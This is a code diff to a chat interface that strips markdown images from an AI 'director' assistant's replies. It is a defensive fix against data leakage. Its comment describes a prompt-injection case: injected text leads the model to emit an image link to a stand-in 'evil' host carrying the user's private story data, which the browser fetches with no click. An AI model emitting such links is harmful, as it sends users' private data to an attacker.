@@ -28,6 +28,20 @@ export const DirectorMark: React.FC<{ className?: string }> = ({ className }) =>
 
 const isLong = (text: string) => text.length > CLAMP_CHARS || text.split('\n').length > CLAMP_LINES;
 
+// Director replies render through ChatMarkdown, whose sanitizer keeps remote `<img src>`
+// and the SPA ships no CSP. Because the director's context carries the user's private
+// premise, cast and notes (some derived from attached/pasted text), an injected instruction
+// could make it emit `![](https://evil/x?d=<story data>)` — which the browser fetches with
+// zero clicks the moment the delta streams in, leaking the story. The director speaks in
+// plain sentences and shows visuals through cards, so it never needs markdown images:
+// strip image markup down to its alt text before rendering. (ChatMarkdown is shared with
+// the main chat, which does use thumbnails, so the stripping stays local to the director.)
+const stripMarkdownImages = (text: string): string =>
+  text
+    .replace(/!\[([^\]]*)\]\([^)]*\)/g, '$1') // inline  ![alt](url)
+    .replace(/!\[([^\]]*)\]\[[^\]]*\]/g, '$1') // reference  ![alt][id]
+    .replace(/!\[([^\]]*)\]/g, '$1'); // shortcut  ![alt]
+
 // ── User ─────────────────────────────────────────────────────────────────────
 
 export interface UserBubbleProps {
@@ -146,7 +160,7 @@ export const StreamingCaret: React.FC = () => (
 );
 
 export const AssistantMessage: React.FC<AssistantMessageProps> = ({ msg, draft, streaming, showSuggestions, studio }) => {
-  const text = draft ?? msg.text ?? '';
+  const text = stripMarkdownImages(draft ?? msg.text ?? '');
   const cards = Array.isArray(msg.cards) ? msg.cards : [];
   const suggestions = showSuggestions ? (msg.suggestions || []).filter((s) => typeof s === 'string' && s.trim()).slice(0, 4) : [];
   return (
